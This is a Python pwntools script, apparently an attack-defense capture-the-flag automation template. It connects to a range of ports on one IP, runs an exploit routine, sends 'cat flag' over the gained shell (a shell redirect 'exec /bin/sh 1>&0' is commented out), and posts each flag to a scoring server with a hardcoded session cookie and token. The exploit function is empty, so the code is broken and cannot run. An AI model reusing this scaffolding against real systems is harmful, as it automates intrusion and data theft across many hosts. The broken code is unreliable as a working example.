from pwn import *
import requests
context.binary = './pwn'
#context.log_level = 'debug'
#context.timeout = None
elf = context.binary
libc = elf.libc


def exploit(p):

def submit_flag(flag):
    url = 'http://47.108.30.122/commit/flag'
    headers = {'Host': '47.108.30.122','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept': 'application/json, text/javascript, */*; q=0.01','Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2','Accept-Encoding': 'gzip, deflate','Content-Type': 'application/json; charset=UTF-8','X-Requested-With': 'XMLHttpRequest','Connection': 'close','Referer': 'http://47.108.30.122/admin','Cookie': 'PHPSESSID=du7c7fo0dklk54k75nivmen236'}
    data = '{"flag":"' + flag + '","token":"85614a0acbbdf27e712e9e87f38735cf"}'
    print(data)
    req = requests.post(url,data=data,headers=headers)
    print(req.text)




def play(ip,port):
	global p 
	p =remote(ip,port)
	exploit(p)
	
	#p.sendline('exec /bin/sh 1>&0')

	p.sendline('cat flag')
	flag=p.recvuntil('}', timeout=0.5)
	print flag
	return flag

def exp():
	for _ in range(9,17):
		if _ <10:
			_ = '0'+ str(_)
		_ = str(_)
		ip = '47.108.30.122'
		port = '4{}80'.format(_)
		try:
			flag=play(ip,port)
			submit_flag(flag)
			# if flag != null:
			#     submit_flag(flag)
		except Exception as e:
			print(e)
			continue

if __name__ == '__main__':
	exp()